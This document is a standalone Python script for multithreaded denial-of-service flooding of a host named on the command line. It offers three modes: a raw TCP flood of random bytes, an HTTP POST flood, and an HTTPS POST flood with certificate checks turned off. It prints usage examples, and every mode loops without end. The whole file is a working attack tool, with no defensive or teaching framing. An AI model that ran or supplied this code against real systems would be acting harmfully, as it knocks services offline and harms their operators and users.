#!/usr/bin/env python3
import argparse
import random
import socket
import threading
import requests

print("TCP Flood: python3 script.py -i 127.0.0.1 -p 443 -c y -t 1000 -th 10")
print("HTTP POST Flood: python3 script.py -i 127.0.0.1 -p 80 -c http -t 1000 -th 10")
print("HTTPS POST Flood: python3 script.py -i 127.0.0.1 -p 443 -c https -t 1000 -th 10")

# Argument parsing
ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host IP")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="tcp ddos(y), http post(http), https post(https)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

# TCP flood attack
def run_tcp_flood():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for x in range(times):
                s.send(data)
            print(i + " Sent!!!")
        except:
            s.close()
            print("[!] Connection error!")

# HTTP POST flood attack
def run_http_post_flood():
    url = f"http://{ip}:{port}"
    data = {"key": "value"}
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            response = requests.post(url, data=data)
            print(i + f" Sent!!! Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print("[!] Error:", e)

# HTTPS POST flood attack
def run_https_post_flood():
    url = f"https://{ip}:{port}"
    data = {"key": "value"}
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            response = requests.post(url, data=data, verify=False)  # Skip SSL certificate validation
            print(i + f" Sent!!! Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print("[!] Error:", e)

# Thread management
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target=run_tcp_flood)
        th.start()
    elif choice == 'http':
        th = threading.Thread(target=run_http_post_flood)
        th.start()
    elif choice == 'https':
        th = threading.Thread(target=run_https_post_flood)
        th.start()
